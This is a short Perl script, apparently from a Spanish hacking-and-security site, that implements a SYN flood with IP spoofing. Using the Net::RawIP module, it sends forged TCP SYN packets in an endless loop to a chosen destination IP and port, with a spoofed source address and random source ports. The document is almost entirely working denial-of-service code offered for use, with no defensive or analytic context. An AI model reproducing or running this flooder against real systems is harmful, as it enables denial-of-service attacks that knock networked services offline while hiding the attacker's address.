#!/usr/bin/perl
# spoof2.pl - Simple SYN Flooder and IP spoof
# Author: Antonio Taboada
# Derechos: (c) hackingyseguridad.com 2017
# Requires perl, Net::RawIP module, and root privileges

use Net::RawIP;

if($#ARGV == 2) {
   ($src,$dst,$port) = @ARGV;
   $a = new Net::RawIP;
   while(1) {
      $src_port = rand(65534)+1;
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;   
   }
} else {
   print "./spoof2 source_IP destination_IP destination_PORT\n";
}

